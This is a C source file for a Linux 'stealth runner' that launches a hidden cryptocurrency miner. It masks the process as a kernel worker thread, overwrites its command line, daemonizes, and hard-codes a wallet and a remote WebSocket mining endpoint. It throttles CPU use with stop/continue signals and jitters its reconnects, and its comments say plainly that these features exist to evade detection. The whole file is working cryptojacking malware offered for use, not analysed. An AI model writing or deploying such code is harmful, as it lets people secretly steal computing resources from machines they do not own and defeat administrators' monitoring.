// stealth runner for zig-power2b (Linux)
// tactics: innocent process title, daemon double-fork, baked-in creds
// (nothing visible in ps cmdline), nice+SIGSTOP duty-cycle CPU cap,
// jittered reconnect, no .env / no scripts on disk.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

// ---- baked config (no cmdline, no .env) ----
static const char *PAYLOAD_PATH = "./.payload"; // renamed zig-power2b ELF beside runner
static const char *WSS_URL = "wss://thorough-jaquelin-berakitame-aeabd1e4.koyeb.app/bmEucnBsYW50Lnh5ejo3MDIy";
static const char *WALLET = "BgFAEEhn9yvubV7iQ6cZxHU2KrdS6oBEY1.CPU";
static const char *PASS = "x";
static const char *PROC_TITLE = "kworker/u8:2";
static int THREADS = 4;
static int CPU_PCT = 60; // duty-cycle cap

static volatile int run = 1;
static void on_term(int s){ (void)s; run = 0; }

static void set_title(const char *t){
    prctl(PR_SET_NAME, (unsigned long)t, 0, 0, 0);
}

static void daemonize(void){
    if (fork() != 0) _exit(0);
    setsid();
    if (fork() != 0) _exit(0);
    chdir("/");
    close(0); close(1); close(2);
}

int main(int argc, char **argv){
    (void)argc;
    // overwrite argv memory so /proc/PID/cmdline shows innocent title
    size_t total = 0;
    for (int i = 0; argv[i]; i++) total += strlen(argv[i]) + 1;
    if (total > 0){
        memset(argv[0], 0, total);
        strncpy(argv[0], PROC_TITLE, total - 1);
    }
    set_title(PROC_TITLE);
    signal(SIGTERM, on_term); signal(SIGINT, on_term); signal(SIGHUP, SIG_IGN);
    nice(19);
    daemonize();
    set_title(PROC_TITLE);
    srand(time(NULL) ^ getpid());

    while (run){
        pid_t pid = fork();
        if (pid == 0){
            set_title(PROC_TITLE);
            nice(19);
            char th[16]; snprintf(th, sizeof th, "%d", THREADS);
            // argv[0] innocent, real args hidden after exec (still in /proc but title masked)
            execl(PAYLOAD_PATH, PROC_TITLE, "mine-wss", WSS_URL, WALLET, PASS, th, (char*)NULL);
            _exit(127);
        }
        // supervisor: duty-cycle CPU cap via STOP/CONT (period 1000ms)
        int on_ms = CPU_PCT * 10, off_ms = (100 - CPU_PCT) * 10;
        while (run){
            int st; pid_t w = waitpid(pid, &st, WNOHANG);
            if (w == pid) break; // child exited -> reconnect loop
            if (on_ms > 0 && off_ms > 0){
                usleep((useconds_t)(on_ms * 1000));
                if (run) kill(pid, SIGSTOP);
                usleep((useconds_t)(off_ms * 1000));
                if (run) kill(pid, SIGCONT);
            } else sleep(2);
        }
        if (!run){ kill(pid, SIGTERM); break; }
        // jittered backoff 5-20s before reconnect (avoids tight crash loop signature)
        sleep(5 + rand() % 16);
    }
    return 0;
}
